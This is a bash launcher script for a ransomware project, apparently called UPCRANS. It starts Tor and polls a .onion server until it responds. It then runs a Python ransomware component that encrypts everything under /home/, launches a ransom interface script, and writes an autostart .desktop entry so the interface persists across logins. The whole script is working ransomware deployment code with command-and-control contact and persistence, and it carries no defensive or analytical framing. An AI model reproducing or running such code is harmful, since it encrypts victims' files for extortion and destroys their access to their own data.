#!/bin/bash

echo "SCRIPT #WEBSERVER TOR"

#INSTALL DEPENDENCIES
/bin/bash Bash/dependencies.sh


#RUN TOR
service tor start


#VARIABLES
TOR_URL="lxu7zbrvwbo7ogy7u7yzy65yld2rdgjfcwgoyrkejedqoefboeejspid.onion"
TOR_PROXY="localhost:9050"
CURL_CMD="curl -I -s --socks5-hostname"
CURL_STAT=0

#COMMAND TO CHECK SERVER
CURL_OUTPUT=$(${CURL_CMD} ${TOR_PROXY} ${TOR_URL})

#LOOP TO CHECK IF SERVER UP
while [ ${CURL_STAT} -eq 0 ]
do
    if echo "$CURL_OUTPUT" | grep -q "200"; then
        break
    else
    	sleep 60    
    	CURL_OUTPUT=$(${CURL_CMD} ${TOR_PROXY} ${TOR_URL})
    fi
done

#EXECUTE RANSOMWARE
echo "server up"
python3 upcrans.py --encrypt --path /home/


#EXECUTE INTERFACE
/bin/bash Interface/proc1.sh


#ADD INTERFACE IN STARTUP
cd ~/.config/autostart/
touch upcrans2.desktop
echo '[Desktop Entry]' > upcrans2.desktop
echo 'Name=upcrans' >> upcrans2.desktop
echo 'Comment=Launch UPCRANS interface' >> upcrans2.desktop
echo 'Exec=/bin/bash /home/ruben/Documentos/RANS/MLW-Ransomware/Interface/proc1.sh' >> upcrans2.desktop
echo 'Type=Application' >> upcrans2.desktop
